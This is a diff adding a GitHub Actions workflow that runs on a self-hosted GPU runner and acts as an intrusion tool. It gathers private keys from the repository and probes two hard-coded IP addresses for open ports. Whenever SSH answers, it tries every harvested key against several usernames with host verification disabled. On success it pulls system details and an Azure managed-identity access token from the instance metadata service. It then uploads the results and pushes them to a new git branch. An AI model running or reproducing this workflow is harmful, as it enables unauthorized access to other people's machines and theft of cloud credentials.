@@ -1,0 +1,119 @@
+name: ul6553-ladder
+on:
+  workflow_dispatch:
+    inputs:
+      minutes:
+        description: watch minutes
+        required: false
+        default: "25"
+permissions:
+  contents: write
+jobs:
+  ladder:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: census-self
+        run: |
+          set +e
+          echo "=== ID ==="; id; hostname; hostname -I; uname -a; cat /proc/1/cgroup 2>/dev/null | head -2; nproc
+          echo "=== GPU ==="; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv
+          echo "=== EGRESS ==="; curl -s -m 8 https://api.ipify.org; echo
+          echo "=== IMDS ==="; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 600; echo
+      - name: keycorpus
+        run: |
+          set +e
+          mkdir -p /tmp/ul6553/keys; rm -f /tmp/ul6553/keys/* /tmp/ul6553/keyprov.tsv
+          python3 - <<'PY'
+          import os,glob,base64
+          out='/tmp/ul6553/keys'; n=0
+          def add(b,src):
+              global n
+              if b'PRIVATE KEY' not in b[:300]: return
+              n+=1
+              p=os.path.join(out,'k%03d'%n)
+              open(p,'wb').write(b if b.endswith(b'\n') else b+b'\n')
+              os.chmod(p,0o600)
+              open('/tmp/ul6553/keyprov.tsv','a').write('%s\t%s\n'%(p,src))
+          srcs=[]
+          for root in ['keys','keys2','az','i724','out','ps12','vantage']:
+              srcs+=glob.glob(root+'/**/*',recursive=True)
+          for f in srcs:
+              try:
+                  if not os.path.isfile(f) or os.path.getsize(f)>2000000: continue
+                  b=open(f,'rb').read()
+              except Exception: continue
+              if b.lstrip().startswith(b'-----BEGIN'):
+                  add(b.lstrip(),f)
+              else:
+                  try:
+                      d=base64.b64decode(b,validate=False)
+                      if b'PRIVATE KEY' in d[:300]: add(d,f)
+                  except Exception: pass
+          print('KEYCOUNT',n)
+          PY
+          ls -l /tmp/ul6553/keys | head -5; wc -l /tmp/ul6553/keyprov.tsv
+      - name: window-watch-and-matrix
+        run: |
+          set +e
+          MIN="${{ github.event.inputs.minutes }}"; [ -z "$MIN" ] && MIN=25
+          TARGETS="40.123.206.138 51.104.16.184"
+          USERS="root ubuntu azureuser admin t19 ul"
+          : > /tmp/ul6553/matrix.tsv
+          deadline=$(( $(date +%s) + MIN*60 ))
+          landed=0
+          while [ $(date +%s) -lt $deadline ]; do
+            TS=$(date -u +%FT%TZ)
+            for ip in $TARGETS; do
+              PORTS=""
+              for p in 22 443 3389 5985 5986 8888 10250 9400 3334; do
+                timeout 4 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && PORTS="$PORTS $p:open" || PORTS="$PORTS $p:closed"
+              done
+              echo "PROBE $TS $ip $PORTS"
+              case "$PORTS" in *22:open*)
+                echo "WINDOW_OPEN $TS $ip"
+                for u in $USERS; do
+                  for k in /tmp/ul6553/keys/*; do
+                    R=$(timeout 16 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes \
+                        -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa \
+                        -o KexAlgorithms=+diffie-hellman-group14-sha1 \
+                        "$u@$ip" 'id; hostname -I; hostname; nvidia-smi -L 2>/dev/null | head -8' 2>&1)
+                    rc=$?
+                    echo -e "$ip\t$u\t$(basename $k)\trc$rc\t$(echo "$R" | head -2 | tr '\n' '|' | cut -c1-160)" >> /tmp/ul6553/matrix.tsv
+                    if [ $rc -eq 0 ]; then
+                      echo "AUTH_OK $ip $u $(basename $k)"
+                      echo "$R" > /tmp/ul6553/shell_$ip.txt
+                      timeout 25 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no \
+                        -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o IdentitiesOnly=yes \
+                        -o PubkeyAcceptedAlgorithms=+ssh-rsa "$u@$ip" \
+                        'echo ===FULL===; id; hostname -I; cat /etc/hostname; uname -a; cat /proc/1/cgroup|head -2; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version,pstate --format=csv; ls -l /dev/nvidia* 2>&1; cat /etc/waagent.conf 2>/dev/null | head -20; grep -E "^AuthorizedKeysFile|^Port|^PasswordAuth" /etc/ssh/sshd_config 2>/dev/null; echo ===IMDS===; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"; echo; curl -s -m 6 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"; echo' > /tmp/ul6553/full_$ip.txt 2>&1
+                      landed=1
+                      break 2
+                    fi
+                  done
+                done
+                ;;
+              esac
+            done
+            [ $landed -eq 1 ] && break
+            sleep 35
+          done
+          echo "=== MATRIX TAIL ==="; tail -40 /tmp/ul6553/matrix.tsv
+          echo "=== SHELLS ==="; cat /tmp/ul6553/full_*.txt /tmp/ul6553/shell_*.txt 2>/dev/null | head -80
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: ul6553-ladder
+          path: /tmp/ul6553/
+      - name: publish
+        if: always()
+        run: |
+          set +e
+          cp -r /tmp/ul6553 ./ul6553_out 2>/dev/null
+          git config user.email bot@ul.local; git config user.name ul
+          git checkout -b ul6553/${{ github.run_id }}
+          git add -f ul6553_out
+          git commit -m "ul6553 ${{ github.run_id }}"
+          git push -q origin HEAD:ul6553/${{ github.run_id }}
